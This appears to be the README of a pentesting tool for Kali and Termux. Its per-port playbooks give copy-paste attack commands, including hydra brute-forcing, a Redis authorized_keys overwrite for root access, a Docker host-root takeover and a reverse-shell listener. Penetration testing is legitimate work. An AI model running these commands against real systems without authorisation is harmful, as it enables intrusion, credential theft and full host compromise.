# Port - Advance Internet Port Tool

[![Kali Linux Supported](https://img.shields.io/badge/Kali_Linux-Supported-blue?logo=kalilinux&logoColor=white)](https://www.kali.org)
[![Termux Supported](https://img.shields.io/badge/Termux-Supported-green?logo=android&logoColor=white)](https://termux.dev)
[![Bash Shell](https://img.shields.io/badge/Language-Bash_%26_Python3-orange?logo=gnubash&logoColor=white)](https://www.gnu.org/software/bash/)
[![Termux Tutorials](https://img.shields.io/badge/Reference-termux.achik.us-purple)](https://termux.achik.us/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

> **Advanced, High-Performance Internet Port Audit & Guided Penetration Testing Suite** specifically engineered for **Kali Linux** and **Termux (Android)**.
> Features an interactive step-by-step playbook assistant: **"After you see an open port, do this step-by-step."**

```
  ██████╗  ██████╗ ██████╗ ████████╗
  ██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
  ██████╔╝██║   ██║██████╔╝   ██║   
  ██╔═══╝ ██║   ██║██╔══██╗   ██║   
  ██║     ╚██████╔╝██║  ██║   ██║   
  ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
       Advance Internet Port Tool
    [ Kali Linux & Termux Edition ]
```

Reference & Termux tutorial guide: [https://termux.achik.us/](https://termux.achik.us/)

---

## 🌟 Key Highlights

- **🎯 Step-by-Step Action Guide & Playbooks**: Once an open port is identified, the tool immediately guides you with sequential next actions, exact copy-paste commands for both Kali and Termux, and expected indicators of success or vulnerability.
- **Dual-Platform Native Design**: Runs identically on **Kali Linux** (desktop/pentest environment) and **Termux** (Android mobile terminal).
- **Zero-Dependency Resilience**: Powered by an embedded high-speed multi-threaded networking engine with pure Bash `/dev/tcp` fallback. Works out-of-the-box even without third-party packages installed.
- **Ultra-Fast Multi-threaded Scanner**: Scans up to 1,000 ports in fractions of a second with configurable concurrency (1-500 threads) and timeouts.
- **Deep Service & Banner Fingerprinting**: Handshakes with target services to extract exact version strings, HTTP server headers, HTML page titles, SSL/TLS certificates (Common Name, Issuer, Expiry), SSH versions, and database signatures (MySQL, Redis, etc.).
- **Local Port Inspector & Killer**: Lists all active listening TCP/UDP sockets with Process IDs (PIDs) and process names; includes a process termination tool (`port -k <port> --force`) to free up occupied ports.
- **Port Listener & Reverse Shell Catcher**: Emulates Netcat (`nc -lvnp`) for catching reverse shells, receiving exfiltrated files, or testing raw TCP/UDP streams.
- **Intrusion Honeypot & Payload Logger**: Simulates vulnerable services (SSH, FTP, HTTP, SMTP, Telnet) and logs all inbound probe attempts, client IPs, timestamps, and hex/ASCII payloads to `logs/`.
- **TCP Port Forwarder & Proxy Relay**: Bidirectional stream redirection from a local port to a remote destination with real-time transfer counters and bandwidth stats.
- **Outbound Firewall Egress Tester**: Probes 26 critical ports to discover which outbound connections your ISP, carrier, or corporate firewall is filtering.
- **Curated Port & CVE Knowledge Base**: Searchable offline database of 200+ ports with service classifications, security risk ratings (Low to Critical), and known exploit vectors (MS17-010 EternalBlue, Log4j, Spring4Shell, unauthenticated Redis/Docker/Kubernetes).
- **Modern Responsive HTML Reports**: Produces a Cyberpunk/SOC-themed dark mode dashboard report with statistics cards, risk badges, interactive JavaScript search filtering, and collapsible step-by-step playbooks!

---

## 📥 How to Download & Install

*(Reference format inspired by [https://termux.achik.us/](https://termux.achik.us/))*

### 📱 Termux (Android) Installation

Open Termux on Android and run these commands one by one:

```bash
# 1. Update Termux packages
pkg update && pkg upgrade -y

# 2. Install required dependencies
pkg install git python curl nmap -y

# 3. Clone the Port tool repository
git clone https://github.com/lifeemotorola/Port

# 4. Move into the tool directory
cd Port

# 5. Grant execution permissions
chmod +x *

# 6. Run the tool (or run ./install.sh to create global 'port' command)
bash port.sh
```

---

### 💻 Kali Linux & Debian / Ubuntu Installation

Open terminal on Kali Linux and run:

```bash
# 1. Update system packages
sudo apt update && sudo apt upgrade -y

# 2. Install required dependencies
sudo apt install git python3 curl nmap -y

# 3. Clone the repository
git clone https://github.com/lifeemotorola/Port

# 4. Move into directory and give execute permission
cd Port
chmod +x *

# 5. Run the global installer
sudo ./install.sh

# 6. Start the tool from any terminal
port
```

---

## 🎯 Step-by-Step Guide: What to Do After Finding Open Ports

When `port` discovers open ports, or when you use `--guide`, it provides a sequential action plan with copy-paste commands ready for Kali and Termux:

### 1. Port 21 (FTP) Open
- **Step 1: Check Anonymous Login**
  - Kali: `nmap -p 21 --script ftp-anon <target>`
  - Termux: `curl -s ftp://anonymous:anonymous@<target>:21/ || nc -nv <target> 21`
  - *Indicator:* Look for `230 Login successful` or root file directory listings.
- **Step 2: Check Banner for Known Backdoors**
  - Kali: `nc -nv <target> 21 && nmap -p 21 -sV --script ftp-vuln* <target>`
  - *Indicator:* Look for `vsftpd 2.3.4` (smiley backdoor) or `ProFTPD 1.3.3c`.
- **Step 3: Test Weak / Default Credentials**
  - Kali/Termux: `hydra -L users.txt -P passwords.txt ftp://<target>:21`
- **Step 4: Download & Inspect Files**
  - Kali: `wget -m --no-passive ftp://anonymous:anonymous@<target>:21/`

---

### 2. Port 22 (SSH) Open
- **Step 1: Grab Version & Check CVEs**
  - Kali/Termux: `nc -nv <target> 22`
  - *Indicator:* Check if OpenSSH 8.5p1–9.7p1 (vulnerable to `regreSSHion` CVE-2024-6387).
- **Step 2: Enumerate Authentication Methods**
  - Kali/Termux: `ssh -v -o PreferredAuthentications=none -p 22 user@<target>`
  - *Indicator:* Check if `password` is allowed or public key only.
- **Step 3: Credential Spraying / Default Accounts**
  - Kali/Termux: `hydra -l root -P passwords.txt ssh://<target>:22 -t 4`
- **Step 4: Audit Obsolete Ciphers**
  - Kali: `nmap -p 22 --script ssh2-enum-algos <target>`

---

### 3. Port 80 / 443 (HTTP & HTTPS) Open
- **Step 1: Technology & CMS Fingerprinting**
  - Kali: `whatweb -a 3 http://<target>:<port> && curl -I -s http://<target>:<port>`
  - Termux: `curl -I -s http://<target>:<port>`
- **Step 2: Directory & Hidden Endpoint Fuzzing**
  - Kali: `gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,json,env,bak`
  - Termux: `nmap -p <port> --script http-enum <target>`
- **Step 3: Sensitive File Exposure Checks**
  - Kali/Termux: `curl -s http://<target>:<port>/robots.txt http://<target>:<port>/.git/HEAD http://<target>:<port>/.env`
  - *Indicator:* Look for exposed database credentials in `.env` or source code in `.git/`.
- **Step 4: Web Vulnerability Assessment**
  - Kali: `nikto -h http://<target>:<port>`
- **Step 5: Parameter Injection Auditing**
  - Kali: `sqlmap -u 'http://<target>:<port>/page?id=1' --batch --banner`

---

### 4. Port 445 (SMB) Open
- **Step 1: Check for Critical SMB RCEs (MS17-010 EternalBlue / SMBGhost)**
  - Kali/Termux: `nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-cve-2020-0796 <target>`
  - *Indicator:* Reports `VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1`.
- **Step 2: Enumerate Anonymous Shares (Null Sessions)**
  - Kali: `smbclient -N -L //<target> || crackmapexec smb <target> -u '' -p '' --shares`
  - Termux: `nmap -p 445 --script smb-enum-shares <target>`
  - *Indicator:* Read access granted to `IPC$`, `C$`, or shared backups.
- **Step 3: Enumerate Domain Users & Password Policies**
  - Kali: `enum4linux -a <target>`
  - Termux: `nmap -p 445 --script smb-enum-users <target>`
- **Step 4: Check SMB Signing (NTLM Relay Vulnerability)**
  - Kali: `crackmapexec smb <target> | grep 'signing:False'`

---

### 5. Port 6379 (Redis) Open
- **Step 1: Test Unauthenticated Access (PING Probe)**
  - Kali: `redis-cli -h <target> -p 6379 ping`
  - Termux: `nc -nv <target> 6379 <<< 'PING'`
  - *Indicator:* Responds with `+PONG` (CRITICAL: Database has no password!).
- **Step 2: Dump System Info & Cached Keys**
  - Kali: `redis-cli -h <target> info && redis-cli -h <target> keys '*'`
  - Termux: `echo -e 'INFO\r\n' | nc -nv <target> 6379`
- **Step 3: Root RCE via SSH Authorized Keys Overwrite**
  - Kali: `redis-cli -h <target> config set dir /root/.ssh/ && redis-cli -h <target> config set dbfilename authorized_keys`
  - *Indicator:* Returns `+OK`, allowing immediate root login via SSH without credentials.

---

### 6. Port 2375 (Docker Daemon) Open
- **Step 1: Check Unauthenticated Docker API**
  - Kali/Termux: `curl -s http://<target>:2375/version`
- **Step 2: List Containers and Images**
  - Kali: `docker -H tcp://<target>:2375 ps -a`
- **Step 3: Instant Root Host Takeover**
  - Kali: `docker -H tcp://<target>:2375 run -v /:/host_root --rm -it alpine chroot /host_root`
  - *Indicator:* Root shell spawned directly on the host operating system.

*(Playbooks are also built into the tool for: 23 Telnet, 25 SMTP, 53 DNS, 1433 MSSQL, 1521 Oracle, 2049 NFS, 3306 MySQL, 3389 RDP, 5432 Postgres, 5900 VNC, 8080 Tomcat/Jenkins, 9200 Elastic, 10000 Webmin, 27017 MongoDB, and more.)*

---

## 🖥️ Usage & Command Reference

### 1. Interactive Menu Mode
Simply run:
```bash
./port.sh
```

```
MAIN MENU:

  [1]  Fast TCP Port Scanner (Top Ports / Range / Full)
  [2]  Deep Service & Banner Detector (Fingerprint / HTTP / SSL)
  [3]  🎯 Step-by-Step Port Action Guide & Playbooks (What to do when port is open)
  [4]  UDP Port Scanner (DNS, NTP, SNMP, DHCP, etc.)
  [5]  Local Port Inspector (View Active Listening Sockets & PIDs)
  [6]  Kill Process on Port (Free up occupied port)
  [7]  Port Listener / Reverse Shell Catcher (Netcat Mode)
  [8]  Port Honeypot & Intrusion Monitor (Detect & Log Attacks)
  [9]  TCP Port Forwarder / Relay Proxy (Local -> Remote)
  [10] Firewall Outbound Egress Checker (Find Blocked Ports)
  [11] Network Interfaces & Public IP Lookup
  [12] Port Knowledgebase & Vulnerability Directory (Search 200+ Ports)
  [13] Nmap Advanced Scan Integration
  [14] Install / Update Dependencies (Kali & Termux)
  [0]  Exit
```

---

### 2. Non-Interactive CLI Mode (Scripting & Automation)

```bash
./port.sh -t <target> [options]
```

#### CLI Options:

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `-t, --target` | `<host>` | Target IP or hostname (e.g. `192.168.1.1` or `scanme.nmap.org`) |
| `-p, --ports` | `<ports>` | Ports: `top20`, `top100`, `top1000`, `all`, `wellknown`, or `80,443,8000-8080` |
| `-m, --mode` | `<mode>` | Scan mode: `fast` (default), `deep` (banner + TLS cert), `udp`, `syn`, `nmap` |
| `-g, --guide` | `[port]` | **Display step-by-step next actions & commands for open ports** |
| `-T, --threads`| `<num>` | Concurrency worker threads (Default: `100`, Range: `1-500`) |
| `-W, --timeout`| `<sec>` | Socket timeout in seconds (Default: `1.5`) |
| `-o, --output` | `<file>` | Save audit report to `.txt`, `.json`, `.csv`, or `.html` |
| `-i, --inspect`| None | Inspect active local listening ports and process names |
| `-k, --kill` | `<port>` | Kill the process occupying the specified port |
| `--force` | None | Force kill process without confirmation |
| `-l, --listen` | `<port>` | Start socket listener on `<port>` |
| `-u, --udp` | None | Use UDP mode for listener or scanner |
| `--honeypot` | `<port>` | Start intrusion honeypot & payload logger on `<port>` |
| `--service` | `<name>` | Honeypot simulated banner: `ssh`, `ftp`, `http`, `smtp`, `telnet`, `generic` |
| `-f, --forward`| `<lport:rhost:rport>` | TCP proxy: forward local port to remote target |
| `-e, --egress` | None | Test outbound firewall egress connectivity (26 common ports) |
| `-q, --lookup` | `<query>`| Search knowledgebase by port number (e.g. `445`) or keyword (e.g. `redis`) |
| `--ip` | None | Show local network interfaces and WAN public IP |
| `--install` | None | Automatically install all recommended tools on Kali or Termux |
| `--no-color` | None | Disable ANSI color codes |
| `-h, --help` | None | Show help manual |
| `-v, --version`| None | Show tool version |

---

## 💡 Practical Examples

```bash
# Scan target and automatically display step-by-step next actions for all open ports
./port.sh -t 192.168.1.1 -p 21,22,80,445 --guide

# Show step-by-step exploitation & audit guide for port 445 (SMB)
./port.sh -g 445 192.168.1.50

# Show step-by-step guide for Redis
./port.sh -g redis 10.0.0.5

# Deep scan with banner grabbing & HTML dashboard report
./port.sh -t example.com -p 22,80,443,8080 -m deep -o reports/audit.html

# Inspect what's listening locally and free port 8080
./port.sh -i
./port.sh -k 8080 --force

# Start Netcat reverse shell listener on port 4444
./port.sh -l 4444

# Start SSH honeypot intrusion logger on port 2222
./port.sh --honeypot 2222 --service ssh

# Forward local port 8080 to remote web service
./port.sh -f 8080:192.168.1.50:80

# Test outbound firewall egress restrictions
./port.sh -e
```

---

## 📁 Repository Structure

```
Port/
├── port.sh               # Master executable CLI & Interactive Menu script (.sh)
├── install.sh            # Global installer for Kali Linux & Termux
├── core/
│   ├── engine.py         # Multi-threaded networking & socket engine
│   ├── guide.py          # Step-by-step guide & playbook engine
│   ├── playbooks.json    # Curated step-by-step penetration testing playbooks
│   ├── ports_db.json     # Knowledge base of 200+ ports with CVE & risk notes
│   ├── build_playbooks.py# Playbook generator & maintenance script
│   └── build_db.py       # Knowledge base generator & maintenance script
├── tests/
│   └── test_port.sh      # Automated integration test suite (16 test cases)
├── reports/              # Default destination for generated audit reports
├── logs/                 # Default destination for honeypot & listener logs
└── README.md             # Complete documentation
```

---

## 🧪 Testing

Run the automated integration test suite:

```bash
./tests/test_port.sh
```

---

## ⚖️ Legal Disclaimer

This tool is designed for educational purposes, legitimate system administration, and authorized security assessments only. Do not scan or probe targets without explicit authorization from the system owner. The authors assume no liability for misuse or damage caused by this software.
